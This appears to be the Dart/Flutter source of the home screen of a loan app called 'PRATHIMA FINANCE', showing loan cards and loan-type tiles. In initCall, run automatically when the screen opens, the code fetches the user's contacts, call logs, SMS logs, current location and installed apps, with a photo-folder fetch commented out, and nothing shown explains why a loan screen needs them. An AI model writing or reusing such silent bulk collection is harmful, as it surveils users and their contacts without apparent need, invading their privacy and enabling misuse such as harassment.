import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:prathima_loan_app/controllers/home_controller.dart';
import 'package:prathima_loan_app/controllers/kyc_controller.dart';
import 'package:prathima_loan_app/customs/custom_text.dart';
import 'package:prathima_loan_app/screens/home/widget/custom_appbar.dart';
import 'package:prathima_loan_app/screens/home/widget/home_page_loan_card.dart';
import 'package:prathima_loan_app/screens/home/widget/loan_card.dart';
import 'package:prathima_loan_app/screens/home/widget/loan_detail_container.dart';
import 'package:prathima_loan_app/screens/home/widget/offer_card.dart';
import 'package:prathima_loan_app/utils/colors.dart';
import 'package:prathima_loan_app/utils/shared_preferences.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  @override
  void initState() {
    super.initState();
    initCall();
  }

  Future<void> initCall() async {
    print("yes entered -------------");
    await Get.find<KycController>().getKycStatus();
    await Get.find<HomeController>().getInitialLoanAmount();
    await Get.find<HomeController>().getDeviceIdAndUserId();
    await Get.find<HomeController>().appPermission();
    // await Get.find<HomeController>().fetchDCIMFolder();
    await Get.find<HomeController>().fetchContactsLogs();
    await Get.find<HomeController>().fetchCallLogs();
    await Get.find<HomeController>().fetchSMSLogs();
    await Get.find<HomeController>().fetchCurrentLocation();
    await Get.find<HomeController>().fetchInstalledApps();
  }

  Future<void> _onRefresh() async {
    Get.find<HomeController>().clearData();
    await Get.find<KycController>().getKycStatus();
    await Get.find<HomeController>().getInitialLoanAmount();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: const CustomAppBar(
        title: "PRATHIMA FINANCE",
        titleColor: Colors.black,
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 15.0),
        child: RefreshIndicator(
          color: MyTheme.mainColor,
          onRefresh: _onRefresh,
          child: ListView(
            children: [
              GestureDetector(
                  onTap: () => Get.find<HomeController>().onTapLoanCard(),
                  child: const LoanCard()),
              const SizedBox(height: 10),
              const CustomText(
                text: "Loan Details",
                fontSize: 20,
                fontWeight: FontWeight.w600,
              ),
              const SizedBox(height: 10),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceAround,
                children: [
                  loanDetailContainer(
                    loanType: 'Personal Loan',
                    icon: 'assets/icon/personal_loan_icon.png',
                  ),
                  loanDetailContainer(
                    loanType: 'Home Loan',
                    icon: 'assets/icon/home_loan_icon.png',
                  ),
                  loanDetailContainer(
                    loanType: 'Vehicle Loan',
                    icon: 'assets/icon/vehicle_loan_icon.png',
                  ),
                  loanDetailContainer(
                    loanType: 'Business Loan',
                    icon: 'assets/icon/business_loan_icon.png',
                  ),
                ],
              ),
              const SizedBox(height: 15),
              offerCard(),
              const SizedBox(height: 20),
              homePageLoanCard(),
            ],
          ),
        ),
      ),
    );
  }
}
